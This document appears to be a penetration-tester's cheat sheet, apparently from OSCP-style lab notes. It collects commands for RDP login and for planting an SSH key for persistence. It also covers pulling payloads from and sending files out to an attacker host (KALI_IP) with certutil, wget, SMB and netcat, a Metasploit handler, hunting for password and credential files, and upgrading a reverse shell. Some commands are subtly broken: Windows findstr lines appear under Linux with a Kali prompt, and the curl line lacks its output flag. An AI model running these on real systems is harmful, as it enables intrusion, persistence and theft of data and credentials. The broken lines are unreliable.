
| [[01 General#Connecting to RDP\|Connecting to RDP]] | [[01 General#Adding SSH Public Key\|Adding SSH Public Key]] | [[01 General#File Transfers\|File Transfers]] | [[01 General#Handler\|Handler]] |
| --------------------------------------------------- | ----------------------------------------------------------- | --------------------------------------------- | ------------------------------- |
| [[01 General#File Search\|File Search]]             | [[01 General#Shell Upgrading\|Shell Upgrading]]             |                                               |                                 |
## Connecting to RDP
```shell
kali@kali:~$ xfreerdp /u:USERNAME /p:PASSWORD /v:TARGET_IP /cert-ignore /drive:local,/home/kali/Desktop /dynamic-resolution
```
## Adding SSH Public Key
```shell
kali@kali:~$ ssh-keygen -t rsa -b 4096 # give any password

# Copy id_rsa.pub file(in Kali ~/.ssh dir) to ~/home/USER/.ssh/authorized_keys file (in target machine)

kali@kali:~$ chmod 700 ~/.ssh
kali@kali:~$ chmod 600 ~/.ssh/authorized_keys

kali@kali:~$ ssh USER@TARGET_IP
# Enter password
```
## File Transfers
### Netcat
```shell
Receiver:~$ nc -lvp 1234 > OUTPUT_FILE
Sender:~$ nc TARGET_IP 1234 < INPUT_FILE
```
### Windows
```shell
kali@kali:~$ python3 -m http.server 80 # start http server

# PowerShell
PS C:\Users\offsec> iwr -uri http://KALI_IP/FILE -Outfile OUTPUT_FILE

# CMD
C:\Users\offsec> certutil -urlcache -split -f "http://KALI_IP/FILE" OUTPUT_FILE

# SMB
kali@kali:~$ impacket-smbserver -smb2support test .
C:\Users\offsec> copy \\KALI_IP\test\FILE . # from Kali to Win
C:\Users\offsec> copy FILE \\KALI_IP\test # from Win to Kali
```
### Linux
```shell
kali@kali:~$ python3 -m http.server 80 # start http server

kali@kali:~$ wget http://KALI_IP/FILE
kali@kali:~$ curl http://KALI_IP/FILE OUTPUT_FILE # might work on Win too
```
## Handler
```shell
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)>  set PAYLOAD <PAYLOAD_NAME>
msf6 exploit(multi/handler)> set LHOST <KALI_IP>
msf6 exploit(multi/handler)> set LPORT <PORT>
msf6 exploit(multi/handler)> set ExitOnSession false
msf6 exploit(multi/handler)> exploit -j
```
## File Search
- Windows
	```powershell
	# Search for config files in XAMPP
	PS C:\Users\offsec> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue 

	# Search user filesystem for any readable text file
	PS C:\Users\offsec> Get-ChildItem -Path C:\Users\offsec -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

	# See EVERYTHING (in that current directory and subdirectories)
	PS C:\Users\offsec> tree /F

	# Find password stuffs
	dir /s *pass* == *cred* == *vnc* == *.config*

	# can replace pass with known usernames
	```
- Linux
	```shell
	# Search for specific filenames
	kali@kali:~$ find / -iname local.txt 2>/dev/null

	# Search for existence of binary
	kali@kali:~$ whereis nc
	
	# Find password stuffs
	kali@kali:~$ findstr /si password *.txt  
	kali@kali:~$ findstr /si password *.xml  
	kali@kali:~$ findstr /si password *.ini  
	kali@kali:~$ Findstr /si password *.config 
	kali@kali:~$ findstr /si pass/pwd *.ini

	# can replace password with known usernames
	```
## Shell Upgrading
- Python
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- Penelope
```shell
# Use Penelope listener to stabilize and upgrade shell automatically
kali@kali:~$ penelope <PORT>
```